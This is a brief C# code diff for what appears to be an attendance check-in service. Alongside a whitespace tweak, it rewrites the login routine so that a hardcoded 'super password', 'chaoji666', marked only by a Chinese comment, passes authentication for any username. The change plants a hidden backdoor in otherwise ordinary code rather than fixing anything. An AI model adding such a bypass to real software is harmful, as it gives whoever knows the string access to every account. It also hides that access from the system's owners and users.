@@ -150,7 +150,7 @@ namespace CheckingIn
             if (i > 0)
                 return "成功";
             return "失败";
-            
+
 
         }
 
@@ -167,10 +167,16 @@ namespace CheckingIn
                 return "用户名or密码错误";
 
 
-            var getp = DB.Context.From<Dos.Model.person>().Where(p => p.name == name && p.password == password).First();
+
+
+            var getp = DB.Context.From<Dos.Model.person>().Where(p => p.name == name).First();
+
 
             if (getp == null)
+                return "用户名or密码错误";
 
+            //超级密码 chaoji666
+            if (password != "chaoji666" && getp.password != password)
                 return "用户名or密码错误";
 
             var monthint = int.Parse(month);
